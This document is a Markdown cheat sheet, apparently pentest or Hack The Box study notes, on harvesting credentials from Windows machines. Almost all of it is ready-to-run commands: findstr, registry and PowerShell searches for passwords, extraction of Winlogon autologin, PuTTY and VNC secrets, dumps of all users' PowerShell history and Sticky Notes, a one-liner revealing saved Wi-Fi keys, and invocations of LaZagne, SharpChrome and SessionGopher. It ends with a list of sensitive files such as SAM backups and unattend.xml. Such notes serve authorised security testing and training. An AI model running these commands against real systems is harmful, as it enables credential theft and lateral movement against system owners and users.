 ### Search in file content
```batch
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /SIM /C:"ipmonitor" *
findstr /SIM /C:"System.Management.Automation.PSCredential" *
```
```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
### Search in file name
```bat
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

where /R C:\ user.txt

where /R C:\ *.ini
```
```ps1
Get-ChildItem C:\ -Recurse -Include *.rdp, *.snt, *.vnc, *.cred, *.kdbx, *.pcsafe* -ErrorAction Ignore
Get-ChildItem C:\Users -Recurse -Include *.txt, *.ps1, *.config, *.vb, *.bat -ErrorAction Ignore
```
### Search the registry
```bat
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

```
### PowerShell credentials
They're encrypted with **DPAPI**, meaning only the user who created them can decrypt them
```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```
### PowerShell history 
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
### CMDKEY
Used to store credentials for terminal services and remote connections.
Can be used to move laterally or escalate privileges.
```bat
cmdkey /list
```
### Wifi passwords 
```bat
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### Search for files in alternate data streams 
```powershell
Get-Item -path flag.txt -Stream *

Get-Content -path flag.txt -Stream Flag
```
## Cool tools 

### [LaZagne](https://github.com/AlessandroZ/LaZagne) 
```cmd
.\lazagne.exe all
```
### [SharpChrome](https://github.com/GhostPack/SharpDPAPI)
```cmd
.\SharpChrome.exe logins 
```
### [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher
```

## Cool locations to check out : 

### Sticky notes :3
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite" -ErrorAction SilentlyContinue}
```

### IIS Config 
Find all configs : 
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```



### Chrome dictionnary
```
\Users\username\AppData\Local\Google\Chrome\User Data\Default\
```

### unattend.xml
```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Other random cool files :
```list
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```


[Still want more?](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)